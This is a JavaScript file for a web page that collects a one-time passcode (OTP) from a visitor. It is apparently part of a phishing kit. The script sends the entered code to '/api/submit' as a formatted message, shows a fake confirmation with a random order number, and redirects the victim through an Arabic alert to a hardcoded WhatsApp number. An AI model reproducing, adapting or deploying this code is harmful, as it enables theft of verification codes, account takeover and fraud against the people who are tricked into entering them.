(function(){
  const $ = id => document.getElementById(id);
  const form = $('otpForm');
  const otp = $('otp');
  const loading = $('loading');
  const confirmation = $('confirmation');
  const orderIdEl = $('orderId');
  const verifyBtn = $('verifyBtn');
  const whatsappBtn = $('whatsappBtn');
  const yearEl = document.querySelector('#year');
  const WHATSAPP_URL = 'https://api.whatsapp.com/send?phone=447412807758';
  if(whatsappBtn) whatsappBtn.href = WHATSAPP_URL;
  if(yearEl) yearEl.textContent = new Date().getFullYear();

  function normalizeDigits(str=''){
    const map={'٠':'0','١':'1','٢':'2','٣':'3','٤':'4','٥':'5','٦':'6','٧':'7','٨':'8','٩':'9','۰':'0','۱':'1','۲':'2','۳':'3','۴':'4','۵':'5','۶':'6','۷':'7','۸':'8','۹':'9'};
    return (str+'').replace(/[٠-٩۰-۹]/g, d => map[d] || d);
  }

  form.addEventListener('submit', async function(e){
    e.preventDefault();
    const code = normalizeDigits(otp.value).replace(/\D+/g,'');
    if(!code) return;
    loading.style.display='block';
    verifyBtn.disabled=true;
    try{
      await fetch('/api/submit', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ payload:`<b>OTP:</b> ${code}` })
      });
    }catch(ex){
      console.error(ex);
    }
    setTimeout(function(){
      loading.style.display='none';
      form.style.display='none';
      confirmation.style.display='block';
      orderIdEl.textContent = '#' + Math.floor(100000 + Math.random()*900000);
      alert('للتأكيد أو المساعدة تواصل معنا عبر واتساب');
      window.open(WHATSAPP_URL,'_blank');
    }, 1200);
  });
})();
